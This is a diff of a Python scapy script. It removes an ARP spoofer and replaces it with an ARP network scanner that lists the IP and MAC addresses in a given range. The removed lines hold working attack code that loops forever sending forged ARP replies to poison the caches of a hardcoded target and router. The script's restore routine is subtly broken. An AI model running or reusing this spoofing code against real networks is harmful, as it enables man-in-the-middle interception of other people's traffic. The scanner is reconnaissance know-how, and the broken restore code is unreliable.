@@ -1,37 +1,33 @@
-# ARP SPOOFER
+# Network Scanner
 import scapy.all as scapy
-import time
+import argparse
 
-def gmac(ip):
+def args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-t','--target', dest='target', help='IP RANGE OF TARGET')
+    (val) =  parser.parse_args()
+    if not val.target:
+        parser.error('INVALID ARGS, USE --help')
+    return val
+
+def scan(ip):
     arpreq = scapy.ARP(pdst=ip)
     bcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
     arpreqbcast = bcast/arpreq
     anslst = scapy.srp(arpreqbcast, timeout=1, verbose=False)[0]
     
-    return anslst[0][1].hwsrc
+    clilist = []
 
-def spoof(tip, sip): #target ip | target mac | router ip
-    tmac = gmac(tip)
-    pacc = scapy.ARP(op=2, pdst=tip, hwdst=tmac, psrc=sip)
-    scapy.send(pacc, verbose=False)
+    for item in anslst:
+        clidic = {'IP':item[1].psrc,'MAC':item[1].hwsrc}
+        clilist.append(clidic)
+    return clilist
 
-def rest(dstip, srcip):
-    dstmac = gmac(dstip)
-    srcip = gmac(srcip)
-    pacc = scapy.ARP(op=2, pdst=dstip, hdwst=dstip, psrc=srcip)
-    scapy.send(pacc, count=4, verbose=False)
+def printres(reslist):
+    print('IP ADDRESS\t\t\tMAC ADDRESS\n====================================================')
+    for cli in reslist:
+        print(cli['IP'] + '\t\t' + cli['MAC'])
 
-tip = '192.168.1.11'
-sip = '192.168.1.1'
-
-try:
-    pacccnt = 0
-    while True:
-        spoof(tip, sip)
-        spoof(sip, tip)
-        pacccnt += 2
-        print(f'\rPACKETS SENT: {str(pacccnt)}', end="")
-        time.sleep(2)
-except KeyboardInterrupt:
-    print("\nRESETTING ARP...")
-    rest(tip, sip)
+val = args()
+scanres = scan(val.target)
+printres(scanres)
